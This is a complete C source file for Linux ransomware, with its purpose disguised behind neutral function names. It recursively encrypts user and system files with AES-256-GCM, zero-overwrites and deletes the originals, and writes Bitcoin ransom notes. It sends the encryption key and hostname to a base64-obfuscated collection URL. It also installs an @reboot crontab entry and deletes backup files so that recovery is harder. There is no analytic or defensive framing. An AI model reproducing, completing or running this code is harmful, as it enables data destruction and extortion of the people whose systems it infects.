#define _GNU_SOURCE

#include <curl/curl.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <limits.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

typedef struct FileNode {
    char *full_path;
    struct FileNode *next;
} FileNode;

static pthread_mutex_t dir_mutex = PTHREAD_MUTEX_INITIALIZER;
static char **recorded_dirs = NULL;
static size_t recorded_count = 0;
static size_t recorded_capacity = 0;

static uint8_t session_key[32];

char *base64_decode(const char *encoded);

static int has_valid_extension(const char *path) {
    const char *dot = strrchr(path, '.');
    if (dot == NULL || *(dot + 1) == '\0') return 0;
    const char *ext = dot + 1;
    static const char *exts[] = {"xlsx", "docx", "pdf", "txt", "csv", "jpg", "png", "db", "backup", "psd", "zip", "rar"};
    size_t n = sizeof(exts) / sizeof(exts[0]);
    for (size_t i = 0; i < n; i++) {
        if (strcasecmp(ext, exts[i]) == 0) return 1;
    }
    return 0;
}

static int scan_dir(const char *dir, FileNode **head) {
    DIR *dp = opendir(dir);
    if (dp == NULL) return 0;

    struct dirent *entry;
    while ((entry = readdir(dp)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        size_t len = strlen(dir) + strlen(entry->d_name) + 2;
        char *path = malloc(len);
        if (path == NULL) {
            closedir(dp);
            return -1;
        }
        snprintf(path, len, "%s/%s", dir, entry->d_name);

        struct stat st;
        if (lstat(path, &st) == -1) {
            free(path);
            continue;
        }

        if (S_ISLNK(st.st_mode)) {
            free(path);
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            if (scan_dir(path, head) == -1) {
                free(path);
                closedir(dp);
                return -1;
            }
            free(path);
        } else if (S_ISREG(st.st_mode)) {
            if (has_valid_extension(path)) {
                int duplicate = 0;
                for (FileNode *cur = *head; cur != NULL; cur = cur->next) {
                    if (strcmp(cur->full_path, path) == 0) {
                        duplicate = 1;
                        break;
                    }
                }

                if (!duplicate) {
                    FileNode *node = malloc(sizeof(FileNode));
                    if (node == NULL) {
                        free(path);
                        closedir(dp);
                        return -1;
                    }
                    node->full_path = path;
                    node->next = *head;
                    *head = node;
                } else {
                    free(path);
                }
            } else {
                free(path);
            }
        } else {
            free(path);
        }
    }

    closedir(dp);
    return 0;
}

static void free_list_internal(FileNode *head) {
    while (head) {
        FileNode *tmp = head;
        head = head->next;
        free(tmp->full_path);
        free(tmp);
    }
}

FileNode* scan_storage(const char *dir1, const char *dir2, const char *dir3,
                       const char *dir4, const char *dir5) {
    FileNode *head = NULL;
    const char *dirs[5] = {dir1, dir2, dir3, dir4, dir5};

    for (int i = 0; i < 5; i++) {
        if (dirs[i] != NULL) {
            if (scan_dir(dirs[i], &head) == -1) {
                free_list_internal(head);
                return NULL;
            }
        }
    }

    if (head == NULL) return NULL;

    FileNode *prev = NULL, *cur = head, *next;
    while (cur) {
        next = cur->next;
        cur->next = prev;
        prev = cur;
        cur = next;
    }

    return prev;
}

const uint8_t* init_session(void) {
    if (RAND_bytes(session_key, sizeof(session_key)) != 1) {
        return NULL;
    }

    char base64_buf[45];
    int encoded_len = EVP_EncodeBlock((unsigned char*)base64_buf, session_key, sizeof(session_key));
    if (encoded_len < 0 || encoded_len > 44) {
        return NULL;
    }
    base64_buf[44] = '\0';

    FILE* key_file = fopen("/tmp/.master.key", "w");
    if (!key_file) {
        return NULL;
    }

    if (fchmod(fileno(key_file), S_IRUSR | S_IWUSR) == -1) {
        fclose(key_file);
        return NULL;
    }

    if (fprintf(key_file, "{\"aes_key\":\"%s\"}", base64_buf) < 0) {
        fclose(key_file);
        return NULL;
    }

    if (fclose(key_file) != 0) {
        return NULL;
    }

    return session_key;
}

static int record_directory(const char *dir_path) {
    char *copy = strdup(dir_path);
    if (!copy) {
        perror("strdup");
        return -1;
    }
    pthread_mutex_lock(&dir_mutex);
    if (recorded_count >= recorded_capacity) {
        size_t new_cap = recorded_capacity ? recorded_capacity * 2 : 4;
        char **new_dirs = realloc(recorded_dirs, new_cap * sizeof(char *));
        if (!new_dirs) {
            pthread_mutex_unlock(&dir_mutex);
            free(copy);
            perror("realloc");
            return -1;
        }
        recorded_dirs = new_dirs;
        recorded_capacity = new_cap;
    }
    recorded_dirs[recorded_count++] = copy;
    pthread_mutex_unlock(&dir_mutex);
    return 0;
}

static int write_all(FILE *fp, const void *buf, size_t len) {
    size_t written = 0;
    while (written < len) {
        size_t ret = fwrite((const char *)buf + written, 1, len - written, fp);
        if (ret == 0) {
            if (ferror(fp)) {
                perror("fwrite");
                return -1;
            }
            break;
        }
        written += ret;
    }
    return (written == len) ? 0 : -1;
}

static long read_file_bytes(FILE *fp, uint8_t **out_buf) {
    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("fseek");
        return -1;
    }
    long len = ftell(fp);
    if (len < 0) {
        perror("ftell");
        return -1;
    }
    rewind(fp);

    *out_buf = malloc(len);
    if (!*out_buf) {
        perror("malloc");
        return -1;
    }
    size_t nread = fread(*out_buf, 1, len, fp);
    if (nread != (size_t)len) {
        if (ferror(fp)) perror("fread");
        free(*out_buf);
        *out_buf = NULL;
        return -1;
    }
    return len;
}

int apply_transform(const char *file_path, const uint8_t key[32]) {
    FILE *orig_fp = NULL, *out_fp = NULL;
    uint8_t *orig_data = NULL;
    long orig_len = 0;
    uint8_t nonce[12];
    EVP_CIPHER_CTX *ctx = NULL;
    uint8_t *ciphertext = NULL;
    int ciphertext_len = 0;
    uint8_t tag[16];
    char *processed_path = NULL;
    int ret = -1;

    orig_fp = fopen(file_path, "rb");
    if (!orig_fp) {
        fprintf(stderr, "Error: cannot open '%s' for reading: %s\n", file_path, strerror(errno));
        goto cleanup;
    }

    orig_len = read_file_bytes(orig_fp, &orig_data);
    if (orig_len < 0) {
        goto cleanup;
    }
    fclose(orig_fp);
    orig_fp = NULL;

    if (RAND_bytes(nonce, sizeof(nonce)) != 1) {
        fprintf(stderr, "RAND_bytes failed\n");
        goto cleanup;
    }

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "EVP_CIPHER_CTX_new failed\n");
        goto cleanup;
    }
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        fprintf(stderr, "EVP_EncryptInit_ex (cipher) failed\n");
        goto cleanup;
    }
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, sizeof(nonce), NULL) != 1) {
        fprintf(stderr, "EVP_CTRL_GCM_SET_IVLEN failed\n");
        goto cleanup;
    }
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) {
        fprintf(stderr, "EVP_EncryptInit_ex (key+iv) failed\n");
        goto cleanup;
    }

    ciphertext = malloc(orig_len + EVP_MAX_BLOCK_LENGTH);
    if (!ciphertext) {
        perror("malloc");
        goto cleanup;
    }
    int outlen = 0;
    if (EVP_EncryptUpdate(ctx, ciphertext, &outlen, orig_data, (int)orig_len) != 1) {
        fprintf(stderr, "EVP_EncryptUpdate failed\n");
        goto cleanup;
    }
    ciphertext_len = outlen;
    if (EVP_EncryptFinal_ex(ctx, ciphertext + ciphertext_len, &outlen) != 1) {
        fprintf(stderr, "EVP_EncryptFinal_ex failed\n");
        goto cleanup;
    }
    ciphertext_len += outlen;

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, sizeof(tag), tag) != 1) {
        fprintf(stderr, "EVP_CTRL_GCM_GET_TAG failed\n");
        goto cleanup;
    }

    {
        const char *dot = strrchr(file_path, '.');
        size_t base_len = dot ? (size_t)(dot - file_path) : strlen(file_path);
        processed_path = malloc(base_len + 11 + 1);
        if (!processed_path) {
            perror("malloc");
            goto cleanup;
        }
        if (dot) {
            snprintf(processed_path, base_len + 11 + 1, "%.*s%s.PROCESSED",
                     (int)base_len, file_path, dot);
        } else {
            snprintf(processed_path, strlen(file_path) + 11 + 1, "%s.PROCESSED", file_path);
        }
    }

    out_fp = fopen(processed_path, "wb");
    if (!out_fp) {
        fprintf(stderr, "Error: cannot create '%s': %s\n", processed_path, strerror(errno));
        goto cleanup;
    }
    if (write_all(out_fp, nonce, sizeof(nonce)) != 0) goto cleanup;
    if (write_all(out_fp, ciphertext, ciphertext_len) != 0) goto cleanup;
    if (write_all(out_fp, tag, sizeof(tag)) != 0) goto cleanup;
    fclose(out_fp);
    out_fp = NULL;

    {
        FILE *zero_fp = fopen(file_path, "wb");
        if (!zero_fp) {
            fprintf(stderr, "Error: cannot open '%s' for overwrite: %s\n", file_path, strerror(errno));
            goto cleanup;
        }
        uint8_t zero_buf[4096] = {0};
        long remaining = orig_len;
        while (remaining > 0) {
            size_t to_write = (remaining > (long)sizeof(zero_buf)) ? sizeof(zero_buf) : (size_t)remaining;
            if (write_all(zero_fp, zero_buf, to_write) != 0) {
                fclose(zero_fp);
                goto cleanup;
            }
            remaining -= (long)to_write;
        }
        fclose(zero_fp);
        if (remove(file_path) != 0) {
            fprintf(stderr, "Error: cannot remove '%s': %s\n", file_path, strerror(errno));
            goto cleanup;
        }
    }

    {
        char *dir_copy = strdup(file_path);
        if (!dir_copy) {
            perror("strdup");
            goto cleanup;
        }
        char *dir = dirname(dir_copy);
        if (record_directory(dir) != 0) {
            free(dir_copy);
            goto cleanup;
        }
        free(dir_copy);
    }

    ret = 0;

cleanup:
    if (orig_fp) fclose(orig_fp);
    if (out_fp) fclose(out_fp);
    free(orig_data);
    free(ciphertext);
    free(processed_path);
    if (ctx) EVP_CIPHER_CTX_free(ctx);
    return ret;
}

void write_notice(const char **dirs, size_t n_dirs, const char *(*base64_decode_fn)(const char *encoded)) {
    if (dirs == NULL || n_dirs == 0 || base64_decode_fn == NULL) {
        return;
    }

    const char *filename = "#_STATUS_NOTICE_#.txt";
    const char *encoded_address = "MUExelAxZVA1UUdlZmkyRE1QVGZUTDVTUHY3RGl2Zk5h";
    const char *placeholder = "[ADDRESS DECODING FAILED]";

    for (size_t i = 0; i < n_dirs; i++) {
        const char *dir = dirs[i];
        if (dir == NULL) {
            continue;
        }

        size_t path_len = strlen(dir) + strlen(filename) + 2;
        char *filepath = (char *)malloc(path_len);
        if (filepath == NULL) {
            continue;
        }

        snprintf(filepath, path_len, "%s/%s", dir, filename);

        FILE *fp = fopen(filepath, "w");
        free(filepath);
        if (fp == NULL) {
            continue;
        }

        char *decoded_address = NULL;
        const char *address_to_use = placeholder;

        if (base64_decode_fn != NULL) {
            decoded_address = (char *)base64_decode_fn(encoded_address);
            if (decoded_address != NULL) {
                address_to_use = decoded_address;
            }
        }

        fprintf(fp,
            "ATTENTION: All your files have been encrypted.\n"
            "To regain access, you must pay a ransom of 300 USD to the following Bitcoin address:\n"
            "\n"
            "%s\n"
            "\n"
            "After payment, contact us via the secure channel provided in your payment confirmation.\n"
            "Do not attempt to decrypt the files yourself – you will lose them permanently.\n",
            address_to_use);

        if (decoded_address != NULL) {
            free(decoded_address);
        }

        fclose(fp);
    }
}

char *base64_decode(const char *encoded) {
    if (!encoded) return NULL;

    size_t input_len = strlen(encoded);
    size_t output_len = (input_len * 3) / 4;
    unsigned char *decoded = malloc(output_len + 1);
    if (!decoded) return NULL;

    BIO *bio, *b64;
    size_t total = 0;

    bio = BIO_new_mem_buf(encoded, -1);
    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    bio = BIO_push(b64, bio);

    total = BIO_read(bio, decoded, input_len);
    decoded[total] = '\0';

    BIO_free_all(bio);

    if (total == 0) {
        free(decoded);
        return NULL;
    }

    return (char *)decoded;
}

void publish_telemetry(void) {
    FILE *fp = NULL;
    char *file_buf = NULL;
    long file_size = 0;
    char *key_start = NULL;
    char *aes_key = NULL;
    char hostname[256] = "unknown";
    char *json_body = NULL;
    char *decoded_url = NULL;
    CURL *curl = NULL;
    CURLcode res;
    long http_code = 0;
    struct curl_slist *headers = NULL;

    static const char ENCODED_URL[] =
        "aHR0cDovLzE5Mi4xNjguMTUuMTI6ODA4MC9jb2xsZWN0";

    fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        perror("Failed to open key file");
        return;
    }

    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("Failed to seek to end of file");
        fclose(fp);
        return;
    }
    file_size = ftell(fp);
    if (file_size < 0) {
        perror("Failed to get file size");
        fclose(fp);
        return;
    }
    rewind(fp);

    file_buf = malloc(file_size + 1);
    if (!file_buf) {
        perror("Failed to allocate memory for file");
        fclose(fp);
        return;
    }

    if (fread(file_buf, 1, file_size, fp) != (size_t)file_size) {
        fprintf(stderr, "Failed to read complete file\n");
        free(file_buf);
        fclose(fp);
        return;
    }
    file_buf[file_size] = '\0';
    fclose(fp);
    fp = NULL;

    const char *key_field = "\"aes_key\"";
    char *field_pos = strstr(file_buf, key_field);
    if (!field_pos) {
        fprintf(stderr, "Field 'aes_key' not found in key file\n");
        free(file_buf);
        return;
    }

    char *colon = strchr(field_pos + strlen(key_field), ':');
    if (!colon) {
        fprintf(stderr, "Malformed key field\n");
        free(file_buf);
        return;
    }

    char *open_quote = strchr(colon + 1, '"');
    if (!open_quote) {
        fprintf(stderr, "Missing opening quote for key value\n");
        free(file_buf);
        return;
    }

    key_start = open_quote + 1;
    const char *close_quote = strchr(key_start, '"');
    if (!close_quote) {
        fprintf(stderr, "Missing closing quote for key value\n");
        free(file_buf);
        return;
    }

    size_t key_len = close_quote - key_start;
    aes_key = malloc(key_len + 1);
    if (!aes_key) {
        perror("Failed to allocate memory for AES key");
        free(file_buf);
        return;
    }
    strncpy(aes_key, key_start, key_len);
    aes_key[key_len] = '\0';

    if (gethostname(hostname, sizeof(hostname)) != 0) {
        strcpy(hostname, "unknown");
    }
    hostname[sizeof(hostname) - 1] = '\0';

    size_t hostname_len = strlen(hostname);
    size_t max_json_len = strlen("{\"aes_key\":\"\",\"hostname\":\"\"}") +
                          key_len * 2 + hostname_len * 2 + 1;

    json_body = malloc(max_json_len);
    if (!json_body) {
        perror("Failed to allocate memory for JSON body");
        free(aes_key);
        free(file_buf);
        return;
    }

    char *p = json_body;
    size_t remaining = max_json_len;
    int written = snprintf(p, remaining, "{\"aes_key\":\"");
    if (written < 0 || (size_t)written >= remaining) {
        fprintf(stderr, "Failed to format JSON\n");
        goto cleanup;
    }
    p += written;
    remaining -= written;

    for (const char *src = aes_key; *src && remaining > 0; src++) {
        if (*src == '"' || *src == '\\') {
            if (remaining < 2) break;
            *p++ = '\\';
            remaining--;
        }
        *p++ = *src;
        remaining--;
    }

    written = snprintf(p, remaining, "\",\"hostname\":\"");
    if (written < 0 || (size_t)written >= remaining) {
        fprintf(stderr, "Failed to format JSON\n");
        goto cleanup;
    }
    p += written;
    remaining -= written;

    for (const char *src = hostname; *src && remaining > 0; src++) {
        if (*src == '"' || *src == '\\') {
            if (remaining < 2) break;
            *p++ = '\\';
            remaining--;
        }
        *p++ = *src;
        remaining--;
    }

    written = snprintf(p, remaining, "\"}");
    if (written < 0 || (size_t)written >= remaining) {
        fprintf(stderr, "Failed to format JSON\n");
        goto cleanup;
    }

    decoded_url = base64_decode(ENCODED_URL);
    if (!decoded_url) {
        fprintf(stderr, "Failed to decode URL\n");
        goto cleanup;
    }

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize libcurl\n");
        goto cleanup;
    }

    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (!headers) {
        fprintf(stderr, "Failed to create HTTP headers\n");
        goto cleanup;
    }

    curl_easy_setopt(curl, CURLOPT_URL, decoded_url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Curl request failed: %s\n", curl_easy_strerror(res));
        goto cleanup;
    }

    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    if (http_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            perror("Failed to delete key file");
        }
    }

cleanup:
    if (curl) {
        curl_easy_cleanup(curl);
    }
    if (headers) {
        curl_slist_free_all(headers);
    }
    curl_global_cleanup();
    free(decoded_url);
    free(json_body);
    free(aes_key);
    free(file_buf);
    return;
}

static int resolve_binary_path(int argc, char *argv[], char *buf, size_t buf_size)
{
    if (argv != NULL && argv[0] != NULL) {
        if (realpath(argv[0], buf) != NULL)
            return 0;
    }

    ssize_t len = readlink("/proc/self/exe", buf, buf_size - 1);
    if (len == -1) {
        perror("readlink /proc/self/exe");
        return -1;
    }
    buf[len] = '\0';
    return 0;
}

int register_autostart(int argc, char *argv[])
{
    char binary_path[PATH_MAX];

    if (resolve_binary_path(argc, argv, binary_path, sizeof(binary_path)) == -1)
        return -1;

    char expected_line[PATH_MAX + 16];
    snprintf(expected_line, sizeof(expected_line), "@reboot %s\n", binary_path);

    FILE *fp_read = popen("crontab -l 2>/dev/null", "r");
    if (fp_read == NULL) {
        perror("popen crontab -l");
        return -1;
    }

    char **lines = NULL;
    size_t lines_count = 0;
    size_t lines_capacity = 0;
    char *line = NULL;
    size_t line_len = 0;
    ssize_t nread;
    int found = 0;

    while ((nread = getline(&line, &line_len, fp_read)) != -1) {
        if (lines_count >= lines_capacity) {
            lines_capacity = (lines_capacity == 0) ? 64 : lines_capacity * 2;
            char **tmp = realloc(lines, lines_capacity * sizeof(char *));
            if (tmp == NULL) {
                perror("realloc");
                free(line);
                for (size_t i = 0; i < lines_count; i++) free(lines[i]);
                free(lines);
                pclose(fp_read);
                return -1;
            }
            lines = tmp;
        }
        lines[lines_count] = strdup(line);
        if (lines[lines_count] == NULL) {
            perror("strdup");
            free(line);
            for (size_t i = 0; i < lines_count; i++) free(lines[i]);
            free(lines);
            pclose(fp_read);
            return -1;
        }

        if (strcmp(line, expected_line) == 0)
            found = 1;

        lines_count++;
    }

    free(line);
    int ret = pclose(fp_read);
    if (ret == -1) {
        perror("pclose crontab -l");
        for (size_t i = 0; i < lines_count; i++) free(lines[i]);
        free(lines);
        return -1;
    }

    if (!found) {
        FILE *fp_write = popen("crontab -", "w");
        if (fp_write == NULL) {
            perror("popen crontab - (write)");
            for (size_t i = 0; i < lines_count; i++) free(lines[i]);
            free(lines);
            return -1;
        }

        for (size_t i = 0; i < lines_count; i++) {
            if (fputs(lines[i], fp_write) == EOF) {
                perror("fputs crontab line");
                pclose(fp_write);
                for (size_t i = 0; i < lines_count; i++) free(lines[i]);
                free(lines);
                return -1;
            }
        }

        if (fputs(expected_line, fp_write) == EOF) {
            perror("fputs @reboot line");
            pclose(fp_write);
            for (size_t i = 0; i < lines_count; i++) free(lines[i]);
            free(lines);
            return -1;
        }

        if (pclose(fp_write) == -1) {
            perror("pclose crontab -");
            for (size_t i = 0; i < lines_count; i++) free(lines[i]);
            free(lines);
            return -1;
        }
    }

    for (size_t i = 0; i < lines_count; i++) free(lines[i]);
    free(lines);

    const char *scan_dirs[] = {
        "/home/user/backups",
        "/var/backups",
        "/tmp/backups",
        NULL
    };

    int clean_ret = 0;

    for (size_t d = 0; scan_dirs[d] != NULL; d++) {
        const char *dir = scan_dirs[d];
        DIR *dp = opendir(dir);
        if (dp == NULL) {
            perror(dir);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dp)) != NULL) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;

            char full_path[PATH_MAX];
            snprintf(full_path, sizeof(full_path), "%s/%s", dir, entry->d_name);

            struct stat st;
            if (stat(full_path, &st) != 0) {
                perror(full_path);
                continue;
            }

            if (!S_ISREG(st.st_mode))
                continue;

            const char *ext = strrchr(entry->d_name, '.');
            if (ext != NULL &&
                (strcmp(ext, ".bak") == 0 ||
                 strcmp(ext, ".backup") == 0 ||
                 strcmp(ext, ".old") == 0))
            {
                if (remove(full_path) != 0) {
                    perror(full_path);
                    clean_ret = -1;
                }
            }
        }

        closedir(dp);
    }

    return clean_ret;
}

int main(int argc, char *argv[]) {
    const uint8_t *key = init_session();
    if (!key) {
        fprintf(stderr, "init_session failed\n");
        return 1;
    }
    printf("[+] Session key generated and saved.\n");

    FileNode *files = scan_storage("/home", "/root", "/tmp", "/var", "/etc");
    if (!files) {
        fprintf(stderr, "scan_storage returned no files\n");
    } else {
        printf("[+] File scan complete.\n");
        FileNode *cur = files;
        while (cur) {
            printf("    Encrypting: %s\n", cur->full_path);
            if (apply_transform(cur->full_path, key) != 0) {
                fprintf(stderr, "    FAILED: %s\n", cur->full_path);
            }
            cur = cur->next;
        }
        free_list_internal(files);
    }

    if (recorded_count > 0) {
        write_notice((const char **)recorded_dirs, recorded_count, (const char *(*)(const char *))base64_decode);
        printf("[+] Ransom notices written to %zu directories.\n", recorded_count);
    }

    publish_telemetry();
    printf("[+] Telemetry published.\n");

    register_autostart(argc, argv);
    printf("[+] Persistence registered.\n");

    return 0;
}